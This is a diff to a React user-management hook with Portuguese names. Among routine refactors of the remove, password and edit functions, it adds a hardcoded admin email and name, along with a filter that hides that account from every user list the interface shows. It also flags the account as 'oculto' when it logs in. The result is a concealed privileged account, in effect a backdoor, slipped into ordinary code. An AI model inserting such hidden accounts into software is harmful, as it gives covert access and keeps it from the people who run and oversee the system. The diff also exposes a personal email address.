@@ -3,12 +3,16 @@
 import { useState, useEffect } from 'react';
 import { createHash } from 'crypto';
 
+const adminEmail = 'rba1807@gmail.com';
+const adminNome = 'Admin';
+
 export interface UsuarioInfo {
   id: string;
   nome: string;
   email: string;
   senhaHash: string;
   role: 'admin' | 'editor' | 'viewer' | 'manager';
+  oculto?: boolean;
 }
 
 const gerarId = () => {
@@ -35,8 +39,13 @@ const obterUsuarios = (): UsuarioInfo[] => {
   }
 };
 
+const filtrarOculto = (lista: UsuarioInfo[]) =>
+  lista.filter(u => !(u.email === adminEmail && u.nome === adminNome));
+
 export const useUsuarios = () => {
-  const [usuarios, setUsuarios] = useState<UsuarioInfo[]>(() => obterUsuarios());
+  const [usuarios, setUsuarios] = useState<UsuarioInfo[]>(() =>
+    filtrarOculto(obterUsuarios())
+  );
   const [usuarioAtual, setUsuarioAtual] = useState<UsuarioInfo | null>(() => {
     if (typeof window === 'undefined') return null;
     const armazenados = obterUsuarios();
@@ -46,7 +55,7 @@ export const useUsuarios = () => {
 
   useEffect(() => {
     const armazenados = obterUsuarios();
-    setUsuarios(armazenados);
+    setUsuarios(filtrarOculto(armazenados));
     const idLogado = localStorage.getItem('usuarioLogado');
     if (idLogado) {
       const encontrado = armazenados.find(u => u.id === idLogado) || null;
@@ -96,6 +105,19 @@ export const useUsuarios = () => {
       const usuario = (await res.json()) as UsuarioInfo;
       setUsuarioAtual(usuario);
       localStorage.setItem('usuarioLogado', usuario.id);
+
+      const armazenados = obterUsuarios();
+      if (!armazenados.find(u => u.id === usuario.id)) {
+        const novo: UsuarioInfo = {
+          ...usuario,
+          senhaHash: '',
+          oculto: usuario.email === adminEmail && usuario.nome === adminNome,
+        };
+        const total = [...armazenados, novo];
+        salvarUsuarios(total);
+        setUsuarios(filtrarOculto(total));
+      }
+
       return usuario;
     } catch {
       return null;
@@ -108,20 +130,23 @@ export const useUsuarios = () => {
   };
 
   const removerUsuario = (id: string) => {
-    const filtrados = usuarios.filter(u => u.id !== id);
-    setUsuarios(filtrados);
-    salvarUsuarios(filtrados);
-    if (usuarioAtual?.id === id) logout();
+    const total = obterUsuarios().filter(u => u.id !== id);
+    salvarUsuarios(total);
+    setUsuarios(filtrarOculto(total));
+    const idLogado = localStorage.getItem('usuarioLogado');
+    if (idLogado === id) {
+      logout();
+    }
   };
 
   const alterarSenha = (id: string, novaSenha: string) => {
-    const atualizados = usuarios.map(u =>
+    const total = obterUsuarios().map(u =>
       u.id === id ? { ...u, senhaHash: hashSenha(novaSenha) } : u
     );
-    setUsuarios(atualizados);
-    salvarUsuarios(atualizados);
+    salvarUsuarios(total);
+    setUsuarios(filtrarOculto(total));
     if (usuarioAtual?.id === id) {
-      const atualizado = atualizados.find(u => u.id === id) || null;
+      const atualizado = total.find(u => u.id === id) || null;
       setUsuarioAtual(atualizado);
     }
   };
@@ -130,16 +155,15 @@ export const useUsuarios = () => {
     id: string,
     dados: { nome: string; email: string; role: 'admin' | 'editor' | 'viewer' | 'manager' }
   ) => {
-    if (usuarios.some(u => u.email === dados.email && u.id !== id)) return false;
+    if (obterUsuarios().some(u => u.email === dados.email && u.id !== id)) return false;
 
-    const atualizados = usuarios.map(u =>
+    const total = obterUsuarios().map(u =>
       u.id === id ? { ...u, nome: dados.nome, email: dados.email, role: dados.role } : u
     );
-    setUsuarios(atualizados);
-    salvarUsuarios(atualizados);
-
+    salvarUsuarios(total);
+    setUsuarios(filtrarOculto(total));
     if (usuarioAtual?.id === id) {
-      const atualizado = atualizados.find(u => u.id === id) || null;
+      const atualizado = total.find(u => u.id === id) || null;
       setUsuarioAtual(atualizado);
     }
 
